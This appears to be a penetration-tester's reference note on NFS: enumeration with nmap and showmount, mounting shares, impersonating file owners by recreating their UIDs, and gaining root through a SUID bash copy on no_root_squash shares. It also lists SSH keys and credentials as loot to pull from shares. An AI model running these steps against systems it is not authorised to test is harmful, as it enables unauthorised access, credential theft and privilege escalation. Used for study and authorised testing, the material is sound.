
# NFS

Layer 3 enumeration. NFS (Network File System) is a distributed file system protocol native to Linux/Unix. Shares filesystems over a network as if they were local. No built-in authentication -- access control relies on client UID/GID mappings, which can be abused.

> [!warning] UID/GID Authentication
> NFS trusts the UID/GID the client presents. If you can control your local UID, you can often read files owned by another user on the share.

Ports: `2049` TCP/UDP (NFS), `111` TCP/UDP (rpcbind/portmapper)

---

## Workflow

1. Nmap on ports 111 and 2049 with default scripts
2. Run `nfs*` NSE scripts to enumerate exports and contents without mounting
3. `showmount -e` to list available exports and allowed client ranges
4. Mount the share and inspect contents
5. `ls -n` to get raw UIDs/GIDs of file owners
6. If UID mismatch opportunity -- create a local user with matching UID and access restricted files
7. If writable share with `no_root_squash` -- SUID shell privesc

---

## Nmap

```bash
# Service scan on NFS ports
sudo nmap -sV -sC -p111,2049 <target>

# Run all NFS NSE scripts
sudo nmap --script nfs* -sV -p111,2049 <target>
```

| Script | What It Does |
|--------|-------------|
| `nfs-ls` | Lists share contents and permissions without mounting |
| `nfs-showmount` | Shows available exports and allowed client ranges |
| `nfs-statfs` | Filesystem stats (size, used, available) |
| `rpcinfo` | Lists all running RPC services with ports and versions |

---

## showmount

```bash
showmount -e <target>
```

Returns export paths and allowed client ranges. `*` means any host can mount -- enumerate immediately.

---

## Mounting and Inspecting

```bash
mkdir target-NFS
sudo mount -t nfs <target>:/ ./target-NFS/ -o nolock

# List with usernames (resolved via local /etc/passwd)
ls -l ./target-NFS/

# List with raw UIDs/GIDs
ls -n ./target-NFS/

tree ./target-NFS
```

> [!tip] ls -l vs ls -n
> Use `ls -n` to see raw UID/GID numbers -- these are what matter for impersonation, not the resolved names.

---

## Unmounting

```bash
cd ..
sudo umount ./target-NFS
```

---

## UID/GID Impersonation

If you see files owned by a UID you don't have access to:

```bash
# Create a local user with matching UID
sudo useradd -u <uid> fakeuser
sudo su fakeuser

# Now read/write files owned by that UID on the mounted share
cat ./target-NFS/<file>
```

---

## Privilege Escalation via no_root_squash

If the share is writable and `no_root_squash` is set:

```bash
# On attack machine as root -- copy shell and set SUID
cp /bin/bash ./target-NFS/shell
chmod +s ./target-NFS/shell

# On target via SSH -- execute it
/mnt/nfs/shell -p
```

See [[05-Post-Exploitation/Linux-Privilege-Escalation|Linux Privilege Escalation]] for broader context.

---

## What to Look For

- **World-readable exports (`*`)** -- any host can mount. Enumerate everything immediately.
- **`no_root_squash` on a writable share** -- SUID shell privesc. High severity finding.
- **`insecure` option set** -- allows connections from unprivileged ports. Lower barrier to exploit.
- **SSH keys or credentials on the share** -- `id_rsa`, `.env`, config files. Pull and inspect anything non-obvious.
- **UID/GID mismatch opportunity** -- files owned by a UID you can recreate locally.
- **Backup or cron-adjacent scripts** -- writable scripts owned by a privileged user are a privesc path.
- **`nohide` on nested mounts** -- may expose filesystems the admin didn't intend to share.
